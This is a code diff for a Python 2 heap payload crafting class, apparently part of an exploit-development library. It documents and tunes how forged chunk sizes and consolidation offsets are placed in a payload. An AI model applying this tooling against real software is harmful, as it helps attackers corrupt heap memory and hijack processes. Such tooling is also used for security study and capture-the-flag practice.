@@ -57,27 +57,47 @@ class HeapPayloadCrafter(object):
         return full_content
 
     def find_usable_offset(self, i, full_list, unit_len, values_list, total_length, backward=True):
+        """
+        Arguments:
+            i               : start index to check from
+            full_list       : the list to examine values of
+            unit_len        : the length of the segment to be checked if free
+            values_list     : the values to place in a segment if found to be free
+            total_length    : length of the full_list
+            backward        : indicates if this operation is performed for prev or post
+        """
         while True:
+            # Extract a segment from the full list
             segment = full_list[i: i+unit_len]
+
+            # If the segment is not long enough do the following
             if len(segment) != unit_len:
+                # If backward consolidation does not work out, we attempt forward
+                # consolidation
                 if backward:
                     log.info("Backward consolidation not possible. Attempting "\
-                             "Forward consolidation.")
+                             "Forward consolidation. Segment length=%d unit_len=%d"\
+                             %(len(segment), unit_len))
                     self.only_fwd_consol = True
                     self.no_back_consol = True
-                    print "CCCCCCCCCCCCCCCCCCCCCCC"
                     return None
+                # If forward consolidation does not work out, we are unable to craft
+                # a usable payload
                 else:
-                    raise HeaplibException("Not enough space when performing forward consolidation")
-                    print "BBBBBBBBBBBBBBBB"
-                    return None
+                    message = "Not enough space when performing forward consolidation.\n"\
+                              "Segment length=%d unit_len=%d" % (len(segment), unit_len)
+                    raise HeaplibException(message)
+
+            # If we have a segment, we check if its actually usable. If so, bingo!
             elif self.can_use(segment, 0, len(segment)):
                 contents = flat(values_list)
                 full_list[i:i+unit_len] = list(contents)
                 assert len(full_list) == total_length
-                print "AAAAAAAAAAAAAAAAAAAAAAAA"
                 return i
-            i += 1
+
+            # Else, we try the same process from a different offset
+            if backward: i += 1
+            else: i -= 2
 
     def generate_payload(self):
         """
@@ -110,7 +130,7 @@ class HeapPayloadCrafter(object):
         else:
             # Find a contiguous chunk towards the end of `prev` that can be
             # used to place
-            i, unit_len = len(prev), self.size*4
+            i, unit_len = len(prev), self.size*3
             i -= unit_len
             # Lets see if the payload size can be reduced, as we don't really need
             # forward consolidation.
@@ -119,9 +139,11 @@ class HeapPayloadCrafter(object):
                 after_c = flat(-1, -1) # this value is not used
                 prev[-self.size*2:] = list(after_c)
             else:
-                values_list = [-16, -1, -16, -32]
+                if (i % 2) != 0: i -= 1
+                values_list = [-1, -1, -4]
                 SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length, backward=False)
-                SIZE_C = -SIZE_C
+                print ">>>>>>>>>>>>>>>>>>>>>", SIZE_C
+                SIZE_C = -(SIZE_C - 4)
             if self.no_back_consol:
                 SIZE_C |= 1
             else:
